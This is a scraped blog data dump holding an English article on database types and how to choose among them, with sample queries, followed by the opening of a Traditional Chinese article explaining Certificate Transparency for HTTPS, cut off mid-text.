Offline-first apps that sync with cloud databases Popular Examples MongoDB: Most popular document database, rich query language, good tooling Couchbase: High performance, built-in caching, mobile sync capabilities Amazon DocumentDB: MongoDB-compatible, fully managed AWS service Firebase Firestore: Real-time sync, excellent for mobile and web apps 🎬 Real-World ScenarioA blogging platform uses MongoDB to store articles: { &quot;_id&quot;: &quot;article123&quot;, &quot;title&quot;: &quot;Understanding Databases&quot;, &quot;author&quot;: &#123; &quot;name&quot;: &quot;Jane Doe&quot;, &quot;email&quot;: &quot;jane@example.com&quot; &#125;, &quot;content&quot;: &quot;...&quot;, &quot;tags&quot;: [&quot;database&quot;, &quot;tutorial&quot;], &quot;comments&quot;: [ &#123; &quot;user&quot;: &quot;John&quot;, &quot;text&quot;: &quot;Great article!&quot;, &quot;timestamp&quot;: &quot;2023-07-15T10:30:00Z&quot; &#125; ], &quot;published&quot;: true, &quot;views&quot;: 1523 &#125; Everything related to an article - author info, comments, tags - is in one document. Retrieving an article requires one query, not multiple joins. Key-Value Stores: Speed and Simplicity Key-value stores are the simplest type of database, storing data as a collection of key-value pairs. Think of it as a giant hash map or dictionary where you store values using unique keys and retrieve them instantly. How They Work Data is accessed exclusively through keys. You provide a key, and the database returns the associated value. There’s no query language, no joins, no complex operations - just fast lookups. Values can be anything: strings, numbers, JSON objects, or binary data. Strengths Extreme Performance: Key-value lookups are incredibly fast, often sub-millisecond. This makes them ideal for caching and high-throughput applications. Horizontal Scaling: Simple data model makes it easy to distribute data across multiple servers using consistent hashing or similar techniques. Simplicity: Minimal complexity means fewer things can go wrong. Easy to understand, deploy, and maintain. Flexibility: Values can be any data type, and the database doesn’t care about their structure. Weaknesses Limited Queries: You can only retrieve data by key. No searching, filtering, or aggregating without building custom indexes. No Relationships: No built-in support for relationships between data. You must manage relationships in application code. Data Modeling Challenges: Designing effective key structures requires careful planning. Poor key design leads to inefficient access patterns. Best Use Cases Caching: Session data, API responses, computed results Session management: Web application user sessions Real-time data: Leaderboards, counters, rate limiting Shopping carts: Temporary data that doesn’t need complex queries Configuration storage: Application settings, feature flags Popular Examples Redis: In-memory store, rich data structures (lists, sets, sorted sets), pub/sub messaging Amazon DynamoDB: Fully managed, predictable performance, automatic scaling Memcached: Simple, high-performance caching Riak: Distributed, highly available, good for large-scale deployments 🎬 Real-World ScenarioAn e-commerce site uses Redis for session management: Key: &quot;session:abc123&quot; Value: &#123; &quot;user_id&quot;: 456, &quot;cart&quot;: [&quot;item1&quot;, &quot;item2&quot;], &quot;last_activity&quot;: &quot;2023-07-15T14:30:00Z&quot; &#125; When a user makes a request, the application: 1. Extracts session ID from cookie 2. Looks up session data in Redis (&lt; 1ms) 3. Processes request with session context 4. Updates session data if needed This is much faster than querying a relational database for every request. Column-Family Stores: Analytics at Scale Column-family stores (also called wide-column stores) organize data into columns rather than rows. While this sounds similar to relational databases, the architecture is fundamentally different and optimized for different use cases. How They Work Data is stored in column families - groups of related columns. Unlike relational databases that store entire rows together, column stores keep each column’s data together. This makes it extremely efficient to read specific columns across many rows, perfect for analytical queries that aggregate data. Row-oriented vs Column-oriented Storage: Row-oriented (RDBMS): Stores all columns of a row together. Fast for retrieving entire records. Column-oriented: Stores all values of a column together. Fast for aggregating specific columns across many rows. Strengths Analytical Performance: Queries that scan specific columns across millions of rows are extremely fast because only relevant columns are read from disk. Compression: Storing similar data together enables better compression ratios, reducing storage costs and improving I/O performance. Scalability: Designed for distributed systems, handling petabytes of data across thousands of servers. Flexible Schema: Like document databases, column stores allow adding new columns without schema migrations. Weaknesses Write Performance: Optimized for reads, not writes. Inserting or updating data can be slower than row-oriented databases. Complex Queries: Queries involving many columns or complex joins can be inefficient. Learning Curve: Different data modeling approach requires rethinking how you structure data. Best Use Cases Data warehousing: Business intelligence, reporting, analytics Time-series data: IoT sensor data, application metrics, logs Event logging: User activity tracking, audit trails Recommendation engines: Analyzing user behavior patterns Financial analysis: Processing large datasets for risk analysis, fraud detection Popular Examples Apache Cassandra: Distributed, highly available, linear scalability Apache HBase: Built on Hadoop, good for real-time read/write access to big data Google Bigtable: Managed service, powers many Google products Amazon Redshift: Data warehouse service, SQL interface, columnar storage 🎬 Real-World ScenarioA social media platform uses Cassandra to store user activity: Column Family: user_activity Row Key: user_id Columns: timestamp1:action1, timestamp2:action2, ... Query: &quot;Show me all posts by user 123 in July 2023&quot; The database efficiently scans only the relevant column family for user 123, filtering by timestamp. Even with billions of activities across millions of users, the query returns results in milliseconds. graph LR A([📊 Analytical Query]) --> B([Column Store]) B --> C([Read OnlyNeeded Columns]) C --> D([⚡ Fast Aggregation]) E([📊 Same Query]) --> F([Row Store]) F --> G([Read AllColumns]) G --> H([🐌 Slower Processing]) style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#ffebee,stroke:#c62828,stroke-width:2px Graph Databases: Relationships First Graph databases are designed for data where relationships are as important as the data itself. They store data as nodes (entities) and edges (relationships), making it natural to model and query connected data. How They Work Instead of tables or documents, graph databases use nodes to represent entities (people, products, locations) and edges to represent relationships (knows, purchased, located_in). Both nodes and edges can have properties. Traversing relationships is extremely efficient because relationships are first-class citizens, not foreign keys that require joins. Strengths Relationship Queries: Finding connections, paths, and patterns in data is natural and fast. Queries like “friends of friends” or “shortest path” are simple and efficient. Flexible Schema: Easy to add new node types and relationship types without restructuring existing data. Performance: Relationship traversal performance is constant regardless of database size, unlike joins in relational databases that slow down with data growth. Intuitive Modeling: Graph structure maps naturally to many real-world scenarios: social networks, organizational hierarchies, recommendation systems. Weaknesses Limited Aggregation: Not optimized for analytical queries that aggregate large amounts of data. Scaling Challenges: Distributing graph data across multiple servers is complex because relationships often span partitions. Learning Curve: Graph query languages (like Cypher) are different from SQL, requiring developers to learn new concepts. Overkill for Simple Data: If your data doesn’t have complex relationships, graph databases add unnecessary complexity. Best Use Cases Social networks: Friend connections, follower relationships, content sharing Recommendation engines: “Customers who bought X also bought Y” Fraud detection: Finding suspicious patterns in transaction networks Knowledge graphs: Wikipedia-style interconnected information Network topology: IT infrastructure, telecommunications networks Access control: Complex permission hierarchies and role-based access Popular Examples Neo4j: Most popular graph database, Cypher query language, excellent tooling Amazon Neptune: Fully managed, supports both property graph and RDF models ArangoDB: Multi-model database with strong graph capabilities JanusGraph: Distributed, scalable, built on top of other storage backends 🎬 Real-World ScenarioA social network uses Neo4j to model user relationships: // Find friends of friends who like hiking MATCH (me:User &#123;id: 123&#125;)-[:FRIENDS_WITH]-&gt;(friend)-[:FRIENDS_WITH]-&gt;(fof) WHERE (fof)-[:LIKES]-&gt;(:Interest &#123;name: &quot;hiking&quot;&#125;) AND NOT (me)-[:FRIENDS_WITH]-&gt;(fof) RETURN fof.name, COUNT(friend) as mutual_friends ORDER BY mutual_friends DESC LIMIT 10 This query efficiently traverses relationships to find friend recommendations. In a relational database, this would require multiple self-joins and be much slower. graph TB A([👤 Alice]) -->|FRIENDS_WITH| B([👤 Bob]) A -->|FRIENDS_WITH| C([👤 Carol]) B -->|FRIENDS_WITH| D([👤 David]) C -->|FRIENDS_WITH| D D -->|LIKES| E([🏔️ Hiking]) B -->|LIKES| F([📚 Reading]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Time-Series Databases: Optimized for Temporal Data Time-series databases are specialized for data that changes over time: metrics, events, sensor readings. They’re optimized for ingesting, storing, and querying time-stamped data efficiently. How They Work Data is organized by timestamp, with optimizations for time-based queries and aggregations. Time-series databases typically use compression techniques specific to temporal data, achieving 10-100x better compression than general-purpose databases. They often include built-in functions for downsampling, interpolation, and time-window aggregations. Strengths Ingestion Performance: Optimized for high-volume writes of time-stamped data, handling millions of data points per second. Storage Efficiency: Specialized compression algorithms dramatically reduce storage requirements for time-series data. Time-Based Queries: Built-in functions for time windows, aggregations, and temporal analysis make complex queries simple. Retention Policies: Automatic data lifecycle management, downsampling old data or deleting it based on age. Weaknesses Limited Use Cases: Only suitable for time-series data; not a general-purpose database. Update Complexity: Optimized for append-only workloads; updating historical data can be inefficient. Query Limitations: Not designed for complex joins or relationships between different data types. Best Use Cases Application monitoring: Performance metrics, error rates, resource utilization IoT sensor data: Temperature, pressure, location tracking Financial data: Stock prices, trading volumes, market data DevOps: Infrastructure monitoring, log aggregation Industrial systems: Manufacturing metrics, equipment telemetry Popular Examples InfluxDB: Purpose-built for time-series, SQL-like query language TimescaleDB: PostgreSQL extension, combines relational and time-series capabilities Prometheus: Monitoring-focused, pull-based metrics collection Amazon Timestream: Fully managed, serverless time-series database 🎬 Real-World ScenarioAn IoT platform uses InfluxDB to store sensor data: Measurement: temperature Tags: sensor_id&#x3D;sensor1, location&#x3D;warehouse_a Fields: value&#x3D;22.5 Timestamp: 2023-07-15T14:30:00Z Query: &quot;Average temperature per hour for the last 7 days&quot; SELECT MEAN(value) FROM temperature WHERE location&#x3D;&#39;warehouse_a&#39; AND time &gt; now() - 7d GROUP BY time(1h) The database efficiently aggregates millions of data points, returning results in milliseconds. Vector Databases: Similarity Search for AI Vector databases are specialized systems designed to store and query high-dimensional vectors - numerical representations of data like text, images, or audio. They’ve become essential for AI applications, particularly those using machine learning embeddings. How They Work Instead of storing traditional data types, vector databases store vectors (arrays of numbers) that represent the semantic meaning of data. When you search, the database finds vectors that are “close” to your query vector using mathematical distance metrics like cosine similarity or Euclidean distance. This enables semantic search - finding similar items based on meaning, not just exact matches. Example: The sentence “dog playing in park” might be represented as a 1536-dimensional vector like [0.23, -0.45, 0.67, …]. Similar sentences like “puppy running outdoors” would have vectors close in mathematical space. Strengths Semantic Search: Find similar items based on meaning, not keywords. Search for “happy dog” and find “joyful puppy” even though they share no words. AI Integration: Native support for machine learning embeddings from models like OpenAI, BERT, or custom neural networks. Fast Similarity Search: Optimized algorithms (ANN - Approximate Nearest Neighbor) find similar vectors in milliseconds, even with billions of vectors. Multi-Modal Support: Store and search across different data types - text, images, audio - in the same vector space. Weaknesses Specialized Use Case: Only useful when you need similarity search; overkill for traditional queries. Embedding Dependency: Requires external models to generate vectors; quality depends on the embedding model. Storage Requirements: High-dimensional vectors consume significant storage, especially at scale. Approximate Results: Most use approximate algorithms for speed, trading perfect accuracy for performance. Best Use Cases Semantic search: Document search, knowledge bases, Q&amp;A systems Recommendation engines: Similar products, content recommendations Image search: Find similar images, reverse image search Chatbots and RAG: Retrieval-Augmented Generation for AI assistants Anomaly detection: Finding outliers in high-dimensional data Duplicate detection: Finding similar or duplicate content Popular Examples Pinecone: Fully managed, optimized for production AI applications Weaviate: Open-source, built-in vectorization, GraphQL API Milvus: Open-source, high performance, supports multiple indexes Qdrant: Rust-based, filtering capabilities, payload storage pgvector: PostgreSQL extension, combines relational and vector search 🎬 Real-World ScenarioA customer support chatbot uses Pinecone for knowledge retrieval: Indexing: Convert 10,000 support articles into vectors using OpenAI embeddings User Query: &quot;How do I reset my password?&quot; Vector Search: Convert query to vector, find 5 most similar article vectors Response: AI generates answer using retrieved articles as context The system finds relevant articles even when users phrase questions differently: &quot;forgot my password&quot; → finds password reset articles &quot;can't log in&quot; → finds authentication troubleshooting &quot;account locked&quot; → finds account recovery procedures Traditional keyword search would miss these semantic connections. graph TB A([📝 User Query\"How to reset password?\"]) --> B([🔢 Convert to Vector[0.23, -0.45, ...]]) B --> C([🔍 Vector DatabaseFind Similar Vectors]) D([📚 Knowledge BaseArticles as Vectors]) --> C C --> E([📄 Top 5 SimilarArticles Retrieved]) E --> F([🤖 AI GeneratesContextual Answer]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Embedded Databases: Lightweight and Self-Contained Embedded databases are lightweight database engines that run within applications rather than as separate server processes. They’re perfect for mobile apps, desktop applications, and edge devices where simplicity and minimal resource usage are priorities. How They Work Unlike client-server databases, embedded databases run in the same process as your application. The entire database is typically a single file stored locally on the device. No network communication, no separate database server, no complex setup - just include the library and start storing data. Strengths Zero Configuration: No server installation or setup required. Just include the library in your application and start using it. Lightweight: Minimal memory footprint and disk space requirements, perfect for resource-constrained devices. Offline-First: Works without network connectivity, ideal for mobile apps that need to function offline. Fast Performance: No network latency since database runs in-process. Queries execute in microseconds. Portability: Database file can be easily copied, backed up, or transferred between devices. Weaknesses Single Application Access: Only one application can access the database at a time (though some support read-only concurrent access). Limited Scalability: Not designed for high-concurrency or large-scale deployments. No Remote Access: Can’t query the database from another machine without additional infrastructure. Feature Limitations: Fewer features compared to full database servers (no stored procedures, limited user management). Best Use Cases Mobile applications: iOS and Android apps storing user data locally Desktop applications: Configuration, cache, and user data storage IoT and edge devices: Sensor data collection on resource-constrained hardware Browser applications: Client-side data storage in web apps Testing and development: Quick prototyping without database server setup Embedded systems: Automotive, medical devices, industrial equipment Popular Examples SQLite: Most widely deployed database, used in billions of devices (iOS, Android, browsers) Microsoft Access: Desktop database with GUI, good for small business applications and prototyping Realm: Mobile-first database with real-time sync, excellent for iOS and Android LevelDB: Key-value store embedded in Chrome and many applications Berkeley DB: High-performance embedded database for C/C++ applications EdgeDB (IoT): Lightweight, designed for edge computing and IoT devices with limited resources RocksDB: Embedded key-value store optimized for fast storage, used in IoT gateways 📊 Microsoft Access: Desktop DatabaseMicrosoft Access sits between embedded and client-server databases: Strengths: Visual interface for creating tables, forms, and reports without code Integrated with Microsoft Office ecosystem Good for small teams (&lt; 10 concurrent users) Rapid prototyping and small business applications Limitations: Windows-only, requires Microsoft Office license Poor scalability - 2GB file size limit, performance degrades with multiple users Not suitable for web applications or mobile apps Limited security and backup features When to use: Small business databases, departmental applications, quick prototypes that will be migrated to proper databases later. For serious applications, start with PostgreSQL or MySQL instead. 🎬 Real-World ScenarioA mobile fitness app uses SQLite to store workout data: -- Create tables on app first launch CREATE TABLE workouts ( id INTEGER PRIMARY KEY, date TEXT, type TEXT, duration INTEGER, calories INTEGER ); -- Store workout data locally INSERT INTO workouts VALUES (1, &#39;2023-07-15&#39;, &#39;Running&#39;, 30, 250); -- Query workout history SELECT * FROM workouts WHERE date &gt;&#x3D; date(&#39;now&#39;, &#39;-7 days&#39;) ORDER BY date DESC; **Benefits:** - Works offline - users can log workouts without internet - Fast - queries execute instantly on device - Private - data stays on user's device - Simple - no backend server needed for basic functionality - Sync later - can upload to cloud when connection available graph TB A([📱 Mobile App]) --> B([SQLite DatabaseLocal File]) B --> C([Offline AccessNo Network Needed]) C --> D({InternetAvailable?}) D -->|Yes| E([☁️ Sync to CloudOptional]) D -->|No| F([✅ Continue WorkingOffline]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#fff3e0,stroke:#f57c00,stroke-width:2px 💡 SQLite: The World's Most Deployed DatabaseSQLite is likely the most widely used database in the world: Every Android device has SQLite built-in Every iOS device uses SQLite for system data All major web browsers use SQLite Estimated 1+ trillion SQLite databases in active use Public domain - completely free, no licensing Single C file - entire database engine in ~150KB If you've used a smartphone today, you've used SQLite. Search Engines: Full-Text Search and Analytics Search engines like Elasticsearch are specialized databases optimized for full-text search, log analysis, and real-time analytics. While not traditional databases, they’re essential components of modern data architectures. How They Work Data is indexed using inverted indexes, which map words to documents containing them. This makes text search extremely fast. Search engines also support complex queries with relevance scoring, fuzzy matching, and faceted search. Strengths Full-Text Search: Fast, relevant search across large text datasets with features like stemming, synonyms, and typo tolerance. Real-Time Analytics: Aggregate and analyze data in real-time with sub-second response times. Scalability: Distributed architecture handles petabytes of data across clusters. Flexibility: Schema-free JSON documents with dynamic mapping. Weaknesses Not ACID Compliant: Eventual consistency model; not suitable for transactional data. Resource Intensive: Requires significant memory and CPU for indexing and queries. Complexity: Cluster management, tuning, and optimization require expertise. Best Use Cases Website search: E-commerce product search, content search Log analysis: Application logs, security logs, audit trails Business analytics: Real-time dashboards, metrics visualization Recommendation systems: Content discovery based on user behavior Popular Examples Elasticsearch: Most popular, rich ecosystem, powerful analytics Apache Solr: Mature, feature-rich, good for enterprise search Amazon OpenSearch: Managed Elasticsearch-compatible service Choosing the Right Database: Decision Framework With so many database types, how do you choose? Here’s a practical framework: Step 1: Understand Your Data Structure: Is your data highly structured (relational), semi-structured (documents), or unstructured (key-value)? Relationships: Are relationships between data important? How complex are they? Schema Stability: Will your data structure change frequently, or is it stable? Step 2: Analyze Your Access Patterns Read vs Write: Is your workload read-heavy, write-heavy, or balanced? Query Complexity: Do you need complex queries with joins and aggregations, or simple lookups? Real-Time Requirements: Do you need immediate consistency, or is eventual consistency acceptable? Step 3: Consider Scale and Performance Data Volume: How much data will you store? Gigabytes, terabytes, petabytes? Traffic: How many requests per second? Are there traffic spikes? Latency Requirements: What response times do you need? Milliseconds or seconds? Step 4: Evaluate Operational Requirements Team Expertise: What databases does your team know? Operational Complexity: Can you manage a distributed system, or do you need a managed service? Cost: What’s your budget for licensing, infrastructure, and operations? Step 5: Think About the Future Growth: How will your data and traffic grow? Evolution: How might your requirements change? Vendor Lock-in: How easy is it to migrate if needed? 🎯 Quick Decision Guide Structured data with complex relationships → Relational (PostgreSQL, MySQL) Flexible schema, document-oriented → Document (MongoDB, Couchbase) Simple, fast lookups → Key-Value (Redis, DynamoDB) Analytics on large datasets → Column-Family (Cassandra, Redshift) Connected data, relationship queries → Graph (Neo4j, Neptune) Time-stamped metrics and events → Time-Series (InfluxDB, TimescaleDB) Semantic similarity search, AI applications → Vector (Pinecone, Weaviate) Mobile apps, offline-first, embedded systems → Embedded (SQLite, Realm) Full-text search → Search Engine (Elasticsearch, Solr) Polyglot Persistence: Using Multiple Databases Modern applications often use multiple database types, each handling the workload it’s best suited for. This approach, called polyglot persistence, maximizes performance and efficiency. Example Architecture An e-commerce platform might use: PostgreSQL: Order processing, inventory, customer accounts (ACID transactions) MongoDB: Product catalog (flexible schema for varying product attributes) Redis: Session management, shopping carts (fast access, temporary data) Elasticsearch: Product search (full-text search with relevance ranking) Neo4j: Product recommendations (relationship-based suggestions) InfluxDB: Application metrics (time-series monitoring data) graph TB A([🛒 E-commerceApplication]) --> B([PostgreSQLOrders & Inventory]) A --> C([MongoDBProduct Catalog]) A --> D([RedisSessions & Cache]) A --> E([ElasticsearchProduct Search]) A --> F([Neo4jRecommendations]) A --> G([InfluxDBMetrics]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#ffebee,stroke:#c62828,stroke-width:2px style E fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px style F fill:#e0f2f1,stroke:#00796b,stroke-width:2px style G fill:#fce4ec,stroke:#c2185b,stroke-width:2px Benefits Optimized Performance: Each database handles what it does best, maximizing overall system performance. Flexibility: Choose the right tool for each job rather than forcing everything into one database. Scalability: Scale different parts of your system independently based on their specific needs. Challenges Complexity: Managing multiple databases increases operational overhead. Data Consistency: Keeping data synchronized across databases requires careful design. Learning Curve: Teams need expertise in multiple database technologies. Cost: More databases mean more infrastructure and licensing costs. ⚠️ When to Avoid Polyglot PersistenceDon't use multiple databases just because you can. Start simple: Small applications: One database is usually sufficient Limited team: Stick to what your team knows well Tight budget: Multiple databases increase costs Simple requirements: Don't over-engineer Add databases only when you have clear performance or functionality needs that your current database can't meet. Blockchain: Distributed Ledger as Database Blockchain can be considered a specialized type of database, but with unique characteristics that make it fundamentally different from traditional databases. It’s a distributed ledger designed for trustless, tamper-proof record-keeping. How It Works Blockchain stores data in blocks that are cryptographically linked together in a chain. Each block contains transactions, a timestamp, and a hash of the previous block. The database is replicated across multiple nodes in a network, with consensus mechanisms ensuring all nodes agree on the current state without a central authority. Strengths Immutability: Once data is written to the blockchain, it cannot be altered or deleted. This creates an auditable history of all transactions. Decentralization: No single point of control or failure. The database is distributed across many nodes, making it highly resilient. Transparency: All participants can verify transactions and data integrity. The entire history is visible and auditable. Trust Without Authority: Cryptographic proofs and consensus mechanisms enable parties to transact without trusting a central authority. Weaknesses Extremely Slow: Consensus mechanisms make writes orders of magnitude slower than traditional databases. Bitcoin processes ~7 transactions/second vs thousands for traditional databases. Storage Inefficiency: Every node stores the entire blockchain, leading to massive storage redundancy. Bitcoin’s blockchain exceeds 500GB. No Updates or Deletes: Append-only structure means you can’t modify or remove data, only add new records. High Energy Cost: Proof-of-work consensus (like Bitcoin) consumes enormous amounts of electricity. Limited Query Capabilities: No complex queries, joins, or aggregations. Primarily key-value lookups by transaction ID or block number. Best Use Cases Cryptocurrency: Bitcoin, Ethereum, and other digital currencies Supply chain tracking: Immutable record of product provenance Smart contracts: Self-executing agreements on blockchain platforms Digital identity: Decentralized identity verification Audit trails: Tamper-proof logs for compliance and regulatory requirements Popular Examples Bitcoin: First blockchain, cryptocurrency transactions Ethereum: Smart contract platform, programmable blockchain Hyperledger Fabric: Enterprise blockchain for private networks Corda: Blockchain for financial services ⚠️ Blockchain vs Traditional DatabasesUse blockchain when: Multiple parties need to share data without trusting each other Immutability and audit trails are critical Decentralization is more important than performance Use traditional databases when: You need fast reads and writes (almost always) You need to update or delete data You need complex queries and analytics A single organization controls the data Performance and cost matter Reality check: 99% of applications don't need blockchain. Traditional databases are faster, cheaper, and more flexible. Only use blockchain when decentralization and immutability are absolute requirements. graph LR A([📝 New Transaction]) --> B([Block Created]) B --> C([Broadcast to Network]) C --> D([Nodes Validate]) D --> E({ConsensusReached?}) E -->|Yes| F([Block Addedto Chain]) E -->|No| G([TransactionRejected]) F --> H([ImmutableRecord]) style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px style H fill:#e3f2fd,stroke:#1976d2,stroke-width:2px Emerging Trends and Future Directions The database landscape continues to evolve. Here are trends shaping the future: Multi-Model Databases Databases that support multiple data models (document, graph, key-value) in one system, reducing the need for polyglot persistence. Examples: ArangoDB, CosmosDB. Serverless Databases Pay-per-use databases that automatically scale to zero when not in use, eliminating infrastructure management. Examples: Amazon Aurora Serverless, Azure Cosmos DB. Cloud-Native Databases Databases designed specifically for cloud environments, with built-in distribution, replication, and scaling across multiple regions. Unlike traditional databases adapted for the cloud, these are built from the ground up for distributed cloud infrastructure. Key Features: Automatic scaling and self-healing Multi-region replication with strong consistency Pay-per-use pricing models Kubernetes-native deployment Built-in high availability and disaster recovery Examples: Google Spanner: Globally distributed, horizontally scalable, strong consistency CockroachDB: PostgreSQL-compatible, survives datacenter failures, open-source YugabyteDB: Multi-cloud, PostgreSQL-compatible, distributed SQL Amazon Aurora: MySQL/PostgreSQL-compatible, 5x performance improvement Azure Cosmos DB: Multi-model, globally distributed, 99.999% availability SLA NewSQL Databases Combining the scalability of NoSQL with the ACID guarantees of relational databases. Examples: Google Spanner, CockroachDB, VoltDB. AI-Optimized Databases Databases with built-in machine learning capabilities for automated tuning, query optimization, and anomaly detection. Conclusion: The Right Tool for the Right Job The explosion of database types isn’t about replacing relational databases - it’s about expanding our toolkit. Each database type solves specific problems better than general-purpose solutions. Understanding these differences empowers you to make informed decisions that improve performance, reduce costs, and simplify development. The key isn’t memorizing every database feature - it’s understanding the fundamental trade-offs: consistency vs availability, flexibility vs structure, simplicity vs power. With this knowledge, you can evaluate new databases as they emerge and choose the right tool for each job. Start simple. Use what you know. But when you hit limitations - slow queries, scaling challenges, or awkward data modeling - remember that specialized databases exist to solve these exact problems. The database landscape is rich and diverse for a reason: different problems need different solutions. 💭 Final Thought&quot;There is no one-size-fits-all database. The best database is the one that fits your specific use case, team expertise, and operational capabilities.&quot; Choose wisely, but don't overthink it. You can always evolve your architecture as your needs grow. Additional Resources Learning Resources: Database Fundamentals - Comprehensive course on database concepts SQL Tutorial - Interactive SQL learning NoSQL Distilled - Book by Martin Fowler on NoSQL databases Database Documentation: PostgreSQL Documentation MongoDB Manual Redis Documentation Neo4j Documentation Comparison Tools: DB-Engines Ranking - Database popularity and trends Database of Databases - Comprehensive database catalog","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Database","slug":"Database","permalink":"https://neo01.com/tags/Database/"},{"name":"SQL","slug":"SQL","permalink":"https://neo01.com/tags/SQL/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://neo01.com/tags/NoSQL/"},{"name":"Data Storage","slug":"Data-Storage","permalink":"https://neo01.com/tags/Data-Storage/"}]},{"title":"憑證透明化：保護 HTTPS 的公開帳本","slug":"2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS-zh-TW","date":"un11fin11","updated":"un44fin44","comments":true,"path":"/zh-TW/2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS/","permalink":"https://neo01.com/zh-TW/2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS/","excerpt":"探索憑證透明化如何作為 HTTPS 憑證的公開監督機制，透過透明、僅可附加的日誌防止詐欺憑證，讓網路更安全。","text":"還記得你第一次了解 HTTPS 和瀏覽器中那個小鎖頭圖示嗎？你可能感到安心，知道你的連線是加密且安全的。但這裡有個可能讓資安專業人員夜不成眠的問題：你如何知道那個 HTTPS 憑證是合法的？如果有人秘密地為你的銀行網站發行了假憑證呢？ 這正是憑證透明化（Certificate Transparency, CT）所要解決的問題。 2011 年，荷蘭憑證機構 DigiNotar 發生重大資安漏洞，導致為 Google、Yahoo 甚至情報機構等知名網域發行了詐欺憑證。這些假憑證讓攻擊者能夠冒充合法網站，攔截使用者認為安全的加密通訊。這起事件敲響了警鐘：憑證系統需要透明化。 憑證透明化不只是另一個資安協定——它是一種革命性的方法，將憑證發行視為公開帳本。任何憑證機構發行的每個憑證都會被記錄在任何人都可以監控的公開可稽核、僅可附加的日誌中。可以把它想像成 HTTPS 憑證的區塊鏈，但專門為透明化和問責制而設計。 💡 什麼是憑證透明化？憑證透明化（CT）是一個框架，為憑證機構發行的所有 SSL/TLS 憑證建立公開、可驗證的日誌。這些日誌是僅可附加的（憑證可以被新增但永遠不能被移除或修改），並且經過密碼學保護，使得憑證機構幾乎不可能在不被偵測的情況下發行詐欺憑證。 問題：沒有驗證的信任 在憑證透明化之前，憑證系統是基於盲目信任運作的。當你使用 HTTPS 造訪網站時，你的瀏覽器會檢查憑證是否由受信任的憑證機構（CA）簽署。如果是，你會看到綠色鎖頭。如果不是，你會看到可怕的警告。 這個系統有一個關鍵缺陷：它假設憑證機構是無懈可擊且值得信賴的。但憑證機構是由人類經營的，使用有錯誤的軟體，並且可能被攻擊者入侵。當 CA 被入侵或犯錯時，沒有系統性的方法可以偵測詐欺憑證，直到它們被主動用於攻擊。 後果是嚴重的： DigiNotar 漏洞（2011）：為 300 多個網域發行詐欺憑證，導致該 CA 破產 Comodo 漏洞（2011）：為主要網路服務發行假憑證 TURKTRUST 事件（2013）：意外地向客戶發行中繼 CA 憑證 每起事件都侵蝕了對整個憑證生態系統的信任。業界需要一個不僅僅依賴信任憑證機構的解決方案。 graph TB A([🏢 憑證機構發行憑證]) --> B{受信任的 CA？} B -->|是| C([✅ 瀏覽器信任憑證]) B -->|否| D([❌ 瀏覽器顯示警告]) E([⚠️ 問題：無法偵測來自受信任 CA 的詐欺憑證]) -.-> A style E fill:#ffebee,stroke:#c62828,stroke-width:3px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px 解決方案：公開、僅可附加的日誌 憑證透明化引入了一個簡單但強大的概念：讓每個憑證都公開。當憑證機構發行憑證時，它必須將其提交到多個獨立的 CT 日誌。這些日誌具有以下特性： 僅可附加：憑證只能被新增，永遠不能被修改或刪除。這創造了所有已發行憑證的不可變歷史記錄。 公開可稽核：任何人都可以查詢日誌，查看為任何網域發行了哪些憑證。網域擁有者可以監控未經授權的憑證。 密碼學可驗證：日誌使用 Merkle 樹結構來確保完整性。任何對日誌的篡改都會立即被偵測到。 獨立運作：多個組織運作 CT 日誌，防止任何單點故障或控制。 這種透明化將憑證生態系統從「信任但不驗證」轉變為「信任並始終驗證」。 graph LR A([🏢 憑證機構]) --> B([📝 CT 日誌 1]) A --> C([📝 CT 日誌 2]) A --> D([📝 CT 日誌 3]) B --> E([🔍 監控者網域擁有者資安研究人員瀏覽器]) C --> E D --> E E --> F{偵測到詐欺憑證？} F -->|是| G([🚨 警報與撤銷]) F -->|否| H([✅ 維持信任]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px style H fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 憑證透明化如何運作 CT 系統涉及幾個關鍵參與者共同創造透明化： 憑證機構（CAs） 當 CA 發行憑證時，它會將憑證（或預憑證）提交到多個 CT 日誌。日誌會回傳簽署憑證時間戳記（SCT），這是憑證已被記錄的密碼學證明。 CT 日誌 獨立組織運作 CT 日誌，接受憑證提交，將它們新增到僅可附加的日誌中，並回傳 SCT。主要的 CT 日誌營運商包括 Google、Cloudflare、DigiCert 等。日誌使用 Merkle 樹結構建構，允許有效驗證憑證是否包含在日誌中，而無需下載整個日誌。 瀏覽器和客戶端 現代瀏覽器要求憑證在信任之前必須具有有效的 SCT。Chrome、Safari 和其他瀏覽器執行 CT 政策，拒絕信任未被記錄的憑證。這為 CA 參與 CT 創造了強大的誘因。 監控者 網域擁有者、資安研究人員和自動化系統持續監控 CT 日誌，查看為他們關心的網域發行的憑證。當出現意外憑證時，他們可以調查並在詐欺時採取行動。 稽核者 稽核者驗證 CT 